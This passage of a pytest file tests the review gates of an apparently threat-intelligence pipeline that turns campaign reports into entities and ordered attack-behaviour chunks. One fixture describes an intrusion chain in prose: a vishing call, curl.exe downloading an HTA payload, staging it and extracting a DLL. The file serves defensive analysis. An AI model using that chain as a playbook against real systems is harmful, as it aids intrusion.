        assert result["is_sequential"] is True
        assert result["sequentiality_rationale"] == (
            "Catalogue of four campaigns. | Overridden to sequential by the "
            "analyst at the procedure gate."
        )
        assert result["chunks_approved_ids"] == ["ch-1"]

    def test_sequential_override_applies_on_reject(self):
        """A reject re-enters chunk_behaviors, whose prompt depends on the
        flag, so the override must ride along with the rerun."""
        state = {
            "chunks": [{"chunk_id": "ch-1"}],
            "gates_enabled": {"chunks": True},
            "is_sequential": False,
            "sequentiality_rationale": "",
            "chunk_reviews": {
                "reject": {"reason": "bad_flow", "comments": "one shared chain"},
                "is_sequential": True,
            },
        }
        result = gate_chunks(state)
        assert result["chunks_rejection_routing"] == "chunk_behaviors"
        assert result["is_sequential"] is True
        assert result["sequentiality_rationale"] == (
            "Overridden to sequential by the analyst at the procedure gate."
        )

    def test_sequential_override_absent_leaves_state_untouched(self):
        state = {
            "chunks": [{"chunk_id": "ch-1"}],
            "gates_enabled": {"chunks": True},
            "is_sequential": False,
            "chunk_reviews": {"decisions": [{"chunk_id": "ch-1", "action": "approve"}]},
        }
        result = gate_chunks(state)
        assert "is_sequential" not in result
        assert "sequentiality_rationale" not in result

    def test_sequential_override_ignored_when_gate_disabled(self):
        """A disabled gate has no review to honour."""
        state = {
            "chunks": [{"chunk_id": "ch-1"}],
            "gates_enabled": {"chunks": False},
            "is_sequential": False,
            "chunk_reviews": {"is_sequential": True},
        }
        result = gate_chunks(state)
        assert "is_sequential" not in result

    def test_drop_excludes_chunk_from_output(self):
        chunks = [
            {"chunk_id": "ch-1", "text": "a"},
            {"chunk_id": "ch-2", "text": "b"},
            {"chunk_id": "ch-3", "text": "c"},
        ]
        state = {
            "chunks": chunks,
            "gates_enabled": {"chunks": True},
            "chunk_reviews": {
                "decisions": [{"chunk_id": "ch-2", "action": "drop"}],
            },
        }
        result = gate_chunks(state)
        assert result["chunks_approved_ids"] == ["ch-1", "ch-3"]
        assert any(d["action"] == "remove" and d["chunk_id"] == "ch-2"
                   for d in result["chunk_decisions"])

    def test_edit_applies_whitelisted_fields_only(self):
        chunks = [{
            "chunk_id": "ch-1", "text": "old text", "source_excerpt": "old excerpt",
            "behavioral_confidence": 0.5, "sequence_index": 1,
        }]
        state = {
            "chunks": chunks,
            "gates_enabled": {"chunks": True},
            "chunk_reviews": {
                "decisions": [{
                    "chunk_id": "ch-1", "action": "edit",
                    "edits": {
                        "text": "new text",
                        "source_excerpt": "new excerpt",
                        "behavioral_confidence": 0.9,
                        "sequence_index": 99,        # NOT editable
                        "chunk_id": "ch-hax",        # NOT editable
                    },
                }],
            },
        }
        result = gate_chunks(state)
        edited = result["chunks"][0]
        assert edited["text"] == "new text"
        assert edited["source_excerpt"] == "new excerpt"
        assert edited["behavioral_confidence"] == 0.9
        assert edited["sequence_index"] == 1   # unchanged
        assert edited["chunk_id"] == "ch-1"    # unchanged

    def test_added_chunk_gets_new_id_and_next_sequence_index(self):
        chunks = [{"chunk_id": "ch-1", "text": "a", "sequence_index": 1}]
        state = {
            "chunks": chunks,
            "gates_enabled": {"chunks": True},
            "chunk_reviews": {
                "added_chunks": [
                    {"text": "analyst-supplied", "source_excerpt": "from source"},
                ],
            },
        }
        result = gate_chunks(state)
        assert len(result["chunks"]) == 2
        added = result["chunks"][1]
        assert added["text"] == "analyst-supplied"
        assert added["source_excerpt"] == "from source"
        assert added["sequence_index"] == 2
        assert added["chunk_id"].startswith("chk-")
        assert added["chunk_id"] != "ch-1"

    def test_edge_add_appends_to_precedes_ids(self):
        chunks = [
            {"chunk_id": "ch-1", "precedes_ids": []},
            {"chunk_id": "ch-2", "precedes_ids": []},
        ]
        state = {
            "chunks": chunks,
            "gates_enabled": {"chunks": True},
            "chunk_reviews": {
                "edges": [{"action": "add", "from_": "ch-1", "to": "ch-2"}],
            },
        }
        result = gate_chunks(state)
        ch1 = next(c for c in result["chunks"] if c["chunk_id"] == "ch-1")
        assert ch1["precedes_ids"] == ["ch-2"]

    def test_edge_remove_drops_from_precedes_ids(self):
        chunks = [
            {"chunk_id": "ch-1", "precedes_ids": ["ch-2"]},
            {"chunk_id": "ch-2", "precedes_ids": []},
        ]
        state = {
            "chunks": chunks,
            "gates_enabled": {"chunks": True},
            "chunk_reviews": {
                "edges": [{"action": "remove", "from_": "ch-1", "to": "ch-2"}],
            },
        }
        result = gate_chunks(state)
        ch1 = next(c for c in result["chunks"] if c["chunk_id"] == "ch-1")
        assert ch1["precedes_ids"] == []

    def test_edge_add_idempotent(self):
        chunks = [
            {"chunk_id": "ch-1", "precedes_ids": ["ch-2"]},
            {"chunk_id": "ch-2", "precedes_ids": []},
        ]
        state = {
            "chunks": chunks,
            "gates_enabled": {"chunks": True},
            "chunk_reviews": {
                "edges": [{"action": "add", "from_": "ch-1", "to": "ch-2"}],
            },
        }
        result = gate_chunks(state)
        ch1 = next(c for c in result["chunks"] if c["chunk_id"] == "ch-1")
        assert ch1["precedes_ids"] == ["ch-2"]  # not duplicated

    def test_edge_legacy_from_key_back_compat(self):
        """In-flight checkpoints written before the `from_` fix carry the
        reserved keyword `from` instead of `from_`. The gate processor must
        still apply those edges (it reads `from_` first, then falls back to
        `from`)."""
        chunks = [
            {"chunk_id": "ch-1", "precedes_ids": []},
            {"chunk_id": "ch-2", "precedes_ids": []},
        ]
        state = {
            "chunks": chunks,
            "gates_enabled": {"chunks": True},
            "chunk_reviews": {
                "edges": [{"action": "add", "from": "ch-1", "to": "ch-2"}],
            },
        }
        result = gate_chunks(state)
        ch1 = next(c for c in result["chunks"] if c["chunk_id"] == "ch-1")
        assert ch1["precedes_ids"] == ["ch-2"]

    def test_edge_added_to_a_dropped_chunk_is_refused(self):
        """An edge whose target was dropped must not be recorded.

        This previously appended the dangling reference and was documented as
        a known limitation. Downstream filters unresolvable targets, so it was
        latent rather than fatal — but it left the analyst's DAG describing a
        chunk that no longer exists.
        """
        chunks = [
            {"chunk_id": "ch-1", "precedes_ids": []},
            {"chunk_id": "ch-2", "precedes_ids": []},
        ]
        state = {
            "chunks": chunks,
            "gates_enabled": {"chunks": True},
            "chunk_reviews": {
                "decisions": [{"chunk_id": "ch-2", "action": "drop"}],
                "edges": [{"action": "add", "from_": "ch-1", "to": "ch-2"}],
            },
        }
        result = gate_chunks(state)
        ch1 = next(c for c in result["chunks"] if c["chunk_id"] == "ch-1")
        assert ch1["precedes_ids"] == []

    def test_dropping_a_mid_chain_chunk_rewires_the_flow(self):
        """1 -> 2 -> 3, drop 2, expect 1 -> 3.

        Severing the chain made `_build_attack_flow` treat the successor as a
        new root, and forced the analyst to re-add the bridging edge by hand
        after every drop.
        """
        chunks = [
            {"chunk_id": "ch-1", "precedes_ids": ["ch-2"]},
            {"chunk_id": "ch-2", "precedes_ids": ["ch-3"]},
            {"chunk_id": "ch-3", "precedes_ids": []},
        ]
        state = {
            "chunks": chunks,
            "gates_enabled": {"chunks": True},
            "chunk_reviews": {
                "decisions": [{"chunk_id": "ch-2", "action": "drop"}],
            },
        }
        result = gate_chunks(state)
        ids = {c["chunk_id"] for c in result["chunks"]}
        assert ids == {"ch-1", "ch-3"}
        ch1 = next(c for c in result["chunks"] if c["chunk_id"] == "ch-1")
        assert ch1["precedes_ids"] == ["ch-3"], "chain must bridge, not sever"

    def test_consecutive_drops_collapse(self):
        """1 -> 2 -> 3 -> 4 with 2 and 3 dropped leaves 1 -> 4."""
        chunks = [
            {"chunk_id": "ch-1", "precedes_ids": ["ch-2"]},
            {"chunk_id": "ch-2", "precedes_ids": ["ch-3"]},
            {"chunk_id": "ch-3", "precedes_ids": ["ch-4"]},
            {"chunk_id": "ch-4", "precedes_ids": []},
        ]
        state = {
            "chunks": chunks,
            "gates_enabled": {"chunks": True},
            "chunk_reviews": {
                "decisions": [
                    {"chunk_id": "ch-2", "action": "drop"},
                    {"chunk_id": "ch-3", "action": "drop"},
                ],
            },
        }
        result = gate_chunks(state)
        ch1 = next(c for c in result["chunks"] if c["chunk_id"] == "ch-1")
        # This asserted [] until the splice became transitive (shared with the
        # serializer as splice_absent). Severing was the old pass's LIMIT, not
        # a wanted property: the inline version kept a successor only if it had
        # itself survived, so a run of consecutive drops broke the chain. The
        # report still says ch-1 happens before ch-4; only the steps between
        # are unrepresentable. Bridging all the way is the honest reading, and
        # it matches the single-drop case above.
        assert ch1["precedes_ids"] == ["ch-4"], "must bridge across BOTH drops"
        surviving = {c["chunk_id"] for c in result["chunks"]}
        assert set(ch1["precedes_ids"]) <= surviving, "no dangling reference"

    def test_dropping_a_tail_chunk_leaves_no_dangling_reference(self):
        chunks = [
            {"chunk_id": "ch-1", "precedes_ids": ["ch-2"]},
            {"chunk_id": "ch-2", "precedes_ids": []},
        ]
        state = {
            "chunks": chunks,
            "gates_enabled": {"chunks": True},
            "chunk_reviews": {
                "decisions": [{"chunk_id": "ch-2", "action": "drop"}],
            },
        }
        result = gate_chunks(state)
        ch1 = next(c for c in result["chunks"] if c["chunk_id"] == "ch-1")
        assert ch1["precedes_ids"] == []

    def test_an_explicit_edge_edit_still_wins_over_the_splice(self):
        """The analyst's own edge mutation is applied after rewiring."""
        chunks = [
            {"chunk_id": "ch-1", "precedes_ids": ["ch-2"]},
            {"chunk_id": "ch-2", "precedes_ids": ["ch-3"]},
            {"chunk_id": "ch-3", "precedes_ids": []},
            {"chunk_id": "ch-4", "precedes_ids": []},
        ]
        state = {
            "chunks": chunks,
            "gates_enabled": {"chunks": True},
            "chunk_reviews": {
                "decisions": [{"chunk_id": "ch-2", "action": "drop"}],
                "edges": [{"action": "add", "from_": "ch-1", "to": "ch-4"}],
            },
        }
        result = gate_chunks(state)
        ch1 = next(c for c in result["chunks"] if c["chunk_id"] == "ch-1")
        assert ch1["precedes_ids"] == ["ch-3", "ch-4"]

    def test_does_not_mutate_input_chunks(self):
        chunks = [{"chunk_id": "ch-1", "text": "original"}]
        state = {
            "chunks": chunks,
            "gates_enabled": {"chunks": True},
            "chunk_reviews": {
                "decisions": [{"chunk_id": "ch-1", "action": "edit", "edits": {"text": "modified"}}],
            },
        }
        gate_chunks(state)
        assert chunks[0]["text"] == "original"


class TestRouteAfterParse:
    """A failed parse ends the run instead of surfacing an empty Gate 0."""

    def test_failed_parse_routes_to_end(self):
        from app.graph.pipeline import route_after_parse
        state = {"status": PipelineStatus.FAILED.value,
                 "error": "Source file not found: /tmp/pipeline/uploads/x.pdf",
                 "parsed_text": ""}
        assert route_after_parse(state) == "__end__"

    def test_successful_parse_continues_to_figures(self):
        from app.graph.pipeline import route_after_parse
        state = {"status": PipelineStatus.PARSING.value, "parsed_text": "some text"}
        assert route_after_parse(state) == "extract_figures"

    def test_graph_edge_is_conditional(self):
        from app.graph.pipeline import compile_pipeline
        graph = compile_pipeline().get_graph()
        edges = {(e.source, e.target): e.conditional for e in graph.edges}
        assert edges[("parse_and_validate", "extract_figures")] is True
        assert edges[("parse_and_validate", "__end__")] is True


class TestRouteUnlessFailed:
    """The soft-failing LLM nodes end the run on status=failed instead of
    flowing into a gate that overwrites the status. One malformed item of
    181 once failed entity extraction; gate_0 then paused on an empty list
    with an Approve button and the failure read as a thin source."""

    def test_failed_routes_to_end(self):
        from app.graph.pipeline import route_unless_failed
        route = route_unless_failed("gate_0")
        state = {"status": PipelineStatus.FAILED.value,
                 "error": "Entity extraction failed: LLMValidationError: ...",
                 "entities": []}
        assert route(state) == "__end__"

    def test_success_routes_to_next_node(self):
        from app.graph.pipeline import route_unless_failed
        route = route_unless_failed("gate_0")
        state = {"status": PipelineStatus.EXTRACTING_ENTITIES.value,
                 "entities": [{"value": "x"}]}
        assert route(state) == "gate_0"

    def test_router_name_says_where_it_goes(self):
        from app.graph.pipeline import route_unless_failed
        assert route_unless_failed("gate_1").__name__ == "route_unless_failed_to_gate_1"

    def test_graph_edges_are_conditional(self):
        from app.graph.pipeline import compile_pipeline
        graph = compile_pipeline().get_graph()
        edges = {(e.source, e.target): e.conditional for e in graph.edges}
        for node, next_node in (
            ("extract_entities", "gate_0"),
            ("extract_techniques", "draft_procedures"),
            ("draft_procedures", "gate_1"),
        ):
            assert edges[(node, next_node)] is True, (node, next_node)
            assert edges[(node, "__end__")] is True, node


class TestRouteAfterGateChunks:
    """route_after_gate_chunks branches on chunks_rejection_routing."""

    def test_rejection_routes_to_chunk_behaviors(self):
        from app.graph.pipeline import route_after_gate_chunks
        state = {"chunks_rejection_routing": "chunk_behaviors"}
        assert route_after_gate_chunks(state) == "chunk_behaviors"

    def test_no_rejection_routes_to_extract_techniques(self):
        from app.graph.pipeline import route_after_gate_chunks
        assert route_after_gate_chunks({"chunks_rejection_routing": None}) == "extract_techniques"

    def test_missing_routing_field_defaults_to_extract_techniques(self):
        from app.graph.pipeline import route_after_gate_chunks
        assert route_after_gate_chunks({}) == "extract_techniques"


class TestPipelineGraphHasGateChunks:
    """build_pipeline() wires gate_chunks between chunk_behaviors and extract_techniques."""

    def test_gate_chunks_node_registered(self):
        from app.graph.pipeline import build_pipeline
        graph = build_pipeline()
        assert "gate_chunks" in graph.nodes

    def test_compile_default_interrupts_include_gate_chunks(self):
        """compile_pipeline() default interrupt_before list contains gate_chunks."""
        # We don't actually compile (needs a checkpointer); we inspect the
        # default kwargs by recomputing them like compile_pipeline does.
        # This guards against regressions where the new gate is added to
        # the graph but not to interrupt_before.
        from app.graph import pipeline as p
        # Read source: ensure the default list mentions gate_chunks.
        import inspect
        source = inspect.getsource(p.compile_pipeline)
        assert "gate_chunks" in source, "compile_pipeline must interrupt before gate_chunks"


class TestGatePredecessorMap:
    """The `as_node` argument on each /submit endpoint must point at the
    immediate predecessor of the corresponding gate in the compiled graph.

    Tagging the consumer (the gate itself) makes LangGraph skip the gate's
    execution; tagging two-nodes-upstream re-triggers downstream regen and
    can invalidate analyst-referenced IDs. The `predecessor_node` field on
    each entry in `app.api.routes._gate_registry.GATES` encodes the
    contract; this test verifies it stays in sync with `build_pipeline()`'s
    edges.
    """

    def test_predecessor_map_matches_topology(self):
        from app.api.routes._gate_registry import GATES_BY_NODE
        from app.graph.pipeline import build_pipeline

        graph = build_pipeline()
        # graph.edges is a set of (src, dst) tuples for sequential edges.
        # Build dst -> {src} adjacency.
        predecessors: dict[str, set[str]] = {}
        for src, dst in graph.edges:
            predecessors.setdefault(dst, set()).add(src)
        # Conditional edges live in graph.branches: {src: {name: Branch}},
        # where Branch.ends maps router-return-value -> target node. Include
        # them so gates reached via a conditional edge (e.g. gate_chunks,
        # which chunk_behaviors now routes to conditionally) have their
        # predecessor recorded.
        for src, branch_map in getattr(graph, "branches", {}).items():
            for branch in branch_map.values():
                for target in (getattr(branch, "ends", None) or {}).values():
                    predecessors.setdefault(target, set()).add(src)

        for gate_name, gate in GATES_BY_NODE.items():
            expected_predecessor = gate.predecessor_node
            assert gate_name in predecessors, (
                f"gate '{gate_name}' has no inbound edge in build_pipeline() — "
                f"_gate_registry.GATES may be out of date."
            )
            assert expected_predecessor in predecessors[gate_name], (
                f"GATES_BY_NODE['{gate_name}'].predecessor_node = "
                f"'{expected_predecessor}' but pipeline.py edges to "
                f"'{gate_name}' come from {sorted(predecessors[gate_name])}. "
                f"Update the registry or the graph."
            )


class TestGate0LowConfidence:
    """Sub-threshold entities default to remove, overridably."""

    ENTITY = {
        "entity_id": "ent-lc", "entity_type": "victim_sector",
        "value": "financial-services", "confidence": 0.3,
        "low_confidence": True,
        "low_confidence_reason": "confidence 0.30 is below the 0.4 floor",
    }

    def test_untouched_low_confidence_entity_is_removed(self):
        result = gate_0({
            "entities": [dict(self.ENTITY)],
            "gates_enabled": {"entities": True},
            "gate0_reviews": [],
        })
        entity = result["validated_entities"][0]
        assert entity["gate_action"] == GateAction.REMOVE.value

    def test_analyst_approval_overrides_the_floor(self):
        """The floor is a default, not a veto — the analyst may know better."""
        result = gate_0({
            "entities": [dict(self.ENTITY)],
            "gates_enabled": {"entities": True},
            "gate0_reviews": [
                {"entity_id": "ent-lc", "action": GateAction.APPROVE.value},
            ],
        })
        assert result["validated_entities"][0]["gate_action"] == GateAction.APPROVE.value

    def test_confident_entity_is_unaffected(self):
        result = gate_0({
            "entities": [{
                "entity_id": "ent-ok", "entity_type": "intrusion_set",
                "value": "UNC0001", "confidence": 1.0,
            }],
            "gates_enabled": {"entities": True},
            "gate0_reviews": [],
        })
        assert result["validated_entities"][0]["gate_action"] == GateAction.APPROVE.value

    def test_fires_even_when_the_gate_is_disabled(self):
        """A guardrail, not a review prompt — same as the denylist."""
        result = gate_0({
            "entities": [dict(self.ENTITY)],
            "gates_enabled": {"entities": False},
        })
        assert result["validated_entities"][0]["gate_action"] == GateAction.REMOVE.value


class TestGate0AddedEntities:
    """Analysts can add entities the extractor missed.

    Gate 0 had no addition channel — only approve/reject/edit/remove on what
    the LLM produced — so a recall miss was unrecoverable. On one campaign report the
    report named victims in "governments AND legal & professional services";
    only one sector was extracted and there was no way to add the other.
    """

    def test_a_review_with_an_unknown_entity_id_is_ignored(self):
        """The reason additions need their own channel, pinned as a test.

        gate_0 walks the extractor's entity list and matches reviews by
        entity_id. A review carrying an id that matches no entity is simply
        never read — there is no error and no log line.

        That is exactly what the frontend used to do with analyst additions:
        pack them into `reviews` under a synthetic `added_*` id, where they
        were silently discarded. The addition channel below is the fix; this
        test documents why sending them any other way cannot work.
        """
        result = gate_0({
            "entities": [{"entity_id": "e1", "entity_type": "malware", "value": "REAL"}],
            "gates_enabled": {"entities": True},
            "gate0_reviews": [
                {"entity_id": "e1", "action": "approve"},
                {"entity_id": "added_123_abc", "action": "approve",
                 "edited_value": "MISSED", "edited_type": "tool"},
            ],
        })
        values = [e["value"] for e in result["validated_entities"]]
        assert values == ["REAL"], "a synthetic-id review must not create an entity"

    def test_added_entity_enters_validated_pre_approved(self):
        result = gate_0({
            "entities": [],
            "gates_enabled": {"entities": True},
            "gate0_reviews": [],
            "gate0_added_entities": [{
                "value": "commercial", "entity_type": "victim_sector",
                "confidence": 1.0, "rationale": "report names legal services victims",
            }],
        })
        added = result["validated_entities"][0]
        assert added["value"] == "commercial"
        assert added["gate_action"] == GateAction.APPROVE.value
        # Provenance must never be confused with an extractor output.
        assert added["analyst_added"] is True
        assert added["entity_id"].startswith("ent-")

    def test_added_entities_coexist_with_reviews(self):
        result = gate_0({
            "entities": [{
                "entity_id": "ent-1", "entity_type": "intrusion_set",
                "value": "UNC0003", "confidence": 1.0,
            }],
            "gates_enabled": {"entities": True},
            "gate0_reviews": [
                {"entity_id": "ent-1", "action": GateAction.APPROVE.value},
            ],
            "gate0_added_entities": [
                {"value": "legal", "entity_type": "victim_sector"},
            ],
        })
        values = {e["value"] for e in result["validated_entities"]}
        assert values == {"UNC0003", "legal"}

    def test_roles_are_carried_through(self):
        result = gate_0({
            "entities": [],
            "gates_enabled": {"entities": True},
            "gate0_reviews": [],
            "gate0_added_entities": [{
                "value": "United Kingdom", "entity_type": "location",
                "location_role": "victim",
            }],
        })
        assert result["validated_entities"][0]["location_role"] == "victim"

    def test_blank_additions_are_ignored(self):
        result = gate_0({
            "entities": [],
            "gates_enabled": {"entities": True},
            "gate0_reviews": [],
            "gate0_added_entities": [{"value": "   ", "entity_type": "location"}],
        })
        assert result["validated_entities"] == []

    def test_channel_is_cleared_after_consumption(self):
        """Otherwise a rerun loop would re-add them."""
        result = gate_0({
            "entities": [],
            "gates_enabled": {"entities": True},
            "gate0_reviews": [],
            "gate0_added_entities": [
                {"value": "commercial", "entity_type": "victim_sector"},
            ],
        })
        assert result["gate0_added_entities"] == []


class TestGateChunksMerge:
    """Native merge is one gesture, not edit + drop + manual edge.

    During the audit, merging the download chunk with its staging consequence
    took three separate operations, the last of which existed only because
    `drop` severed the chain instead of bridging it.
    """

    CHUNKS = [
        {"chunk_id": "c1", "sequence_index": 1, "text": "Vishing call.",
         "precedes_ids": ["c2"]},
        {"chunk_id": "c2", "sequence_index": 2, "text": "curl.exe downloaded cont.hta.",
         "source_excerpt": "executed curl.exe", "precedes_ids": ["c3"]},
        {"chunk_id": "c3", "sequence_index": 3, "text": "The write staged cont.hta.",
         "source_excerpt": "wrote the payload", "precedes_ids": ["c4"]},
        {"chunk_id": "c4", "sequence_index": 4, "text": "tar extracted the DLL.",
         "precedes_ids": []},
    ]

    def _merge(self, decisions):
        import copy
        return gate_chunks({
            "chunks": copy.deepcopy(self.CHUNKS),
            "gates_enabled": {"chunks": True},
            "chunk_reviews": {"decisions": decisions},
        })

    def test_absorbed_chunk_is_removed_and_text_combined(self):
        result = self._merge(
            [{"chunk_id": "c2", "action": "merge", "merge_with": ["c3"]}],
        )
        ids = [c["chunk_id"] for c in result["chunks"]]
        assert ids == ["c1", "c2", "c4"]
        survivor = next(c for c in result["chunks"] if c["chunk_id"] == "c2")
        assert "curl.exe downloaded" in survivor["text"]
        assert "staged cont.hta" in survivor["text"]

    def test_flow_relinks_through_the_survivor(self):
        """c1 -> c2 -> c3 -> c4 becomes c1 -> c2 -> c4."""
        result = self._merge(
            [{"chunk_id": "c2", "action": "merge", "merge_with": ["c3"]}],
        )
        survivor = next(c for c in result["chunks"] if c["chunk_id"] == "c2")
        assert survivor["precedes_ids"] == ["c4"]

    def test_analyst_supplied_text_wins_over_concatenation(self):
        result = self._merge([{
            "chunk_id": "c2", "action": "merge", "merge_with": ["c3"],
            "edits": {"text": "Download and stage the HTA payload."},
        }])
        survivor = next(c for c in result["chunks"] if c["chunk_id"] == "c2")
        assert survivor["text"] == "Download and stage the HTA payload."

    def test_merging_several_chunks_at_once(self):
        result = self._merge(
            [{"chunk_id": "c2", "action": "merge", "merge_with": ["c3", "c4"]}],
        )
        assert [c["chunk_id"] for c in result["chunks"]] == ["c1", "c2"]

    def test_merge_with_no_resolvable_partner_is_a_no_op(self):
        """A stale id must not silently delete the survivor."""
        result = self._merge(
            [{"chunk_id": "c2", "action": "merge", "merge_with": ["nope"]}],
        )
        assert [c["chunk_id"] for c in result["chunks"]] == ["c1", "c2", "c3", "c4"]
